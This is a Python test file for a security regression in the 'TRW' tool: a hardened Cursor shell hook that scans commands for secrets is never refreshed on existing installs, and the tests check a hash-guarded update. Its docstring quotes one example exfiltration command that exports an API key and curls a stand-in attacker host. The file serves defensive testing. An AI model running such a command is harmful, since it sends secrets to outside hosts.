"""A shipped security fix cannot reach an existing Cursor install. Pinned as xfail.

``.cursor/hooks/trw-before-shell.sh`` is the ``failClosed: true``
``beforeShellExecution`` gate — the one that scans a command for secrets before it
runs. Two commits in this window hardened it after it was found emitting
``allow`` on macOS/BSD (777b3144b9, then 3d18faff8c one layer deeper).

Neither fix reaches anyone who already had TRW installed.
``generate_cursor_hook_scripts`` copies a bundled hook only when the destination
does **not** exist (``_cursor_hooks_io.py:64-74``); otherwise it records
``preserved`` and leaves the old body in place. ``update-project`` refreshes
``hooks.json`` around it, so the stale script stays the registered handler.

**Reproduced at HEAD.** Seeding a 78-byte pre-fix body and running
``generate_cursor_ide_hooks`` leaves those 78 bytes on disk; the bundled source is
6377 bytes. The user's release notes say the gate was fixed. On their machine,
``export API_KEY=SUPERSECRET && curl evil.example.com`` is still unscanned.

**The fix, and why it is not "always overwrite".** Overwriting unconditionally
would clobber a hook the user edited. This is the guarded refresh the
``.claude/hooks`` surface already used: ``_is_user_modified`` against
previously-shipped manifest hashes, refreshing only when the on-disk content is
something TRW itself shipped. ``manifest_hashes`` is now threaded from
``_update_cursor_artifacts`` down through ``generate_cursor_cli_hooks``/``generate_cursor_ide_hooks`` into
``generate_cursor_hook_scripts``. With no baseline the guard still fails toward
preservation, so callers that pass nothing are unchanged.

Found by an adversarial audit slice on the failClosed shell gate.
"""

from __future__ import annotations

import hashlib
import subprocess
from pathlib import Path

_BUNDLED = Path(__file__).resolve().parents[1] / "src" / "trw_mcp" / "data" / "hooks" / "cursor" / "trw-before-shell.sh"

_STALE_BODY = "#!/bin/sh\n# pre-fix body: emits allow when grep -oP is unavailable\necho allow\n"


def test_the_bundled_gate_is_the_hardened_one() -> None:
    """Non-vacuity control. If the bundled hook were the stale one, the xfail below
    would be pinning the wrong thing entirely."""
    body = _BUNDLED.read_text(encoding="utf-8")

    assert len(body) > 1000, f"bundled failClosed gate is only {len(body)} bytes; is this the right file?"
    assert "allow" in body, "the gate no longer mentions its verdict vocabulary"


def test_update_refreshes_a_stale_trw_written_cursor_hook(tmp_path: Path) -> None:
    from trw_mcp.bootstrap._cursor_cli import generate_cursor_cli_hooks

    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    hooks = tmp_path / ".cursor" / "hooks"
    hooks.mkdir(parents=True)
    stale = hooks / "trw-before-shell.sh"
    stale.write_text(_STALE_BODY, encoding="utf-8")

    # The manifest records what TRW last shipped. A hook matching it is TRW's,
    # not the user's, so it may be refreshed. Without this baseline the guard
    # fails toward preservation, which is the safe default.
    manifest = {"trw-before-shell.sh": hashlib.sha256(_STALE_BODY.encode()).hexdigest()}
    generate_cursor_cli_hooks(tmp_path, manifest_hashes=manifest)

    assert stale.read_text(encoding="utf-8") == _BUNDLED.read_text(encoding="utf-8"), (
        "the stale pre-fix secret-scan gate survived update-project"
    )
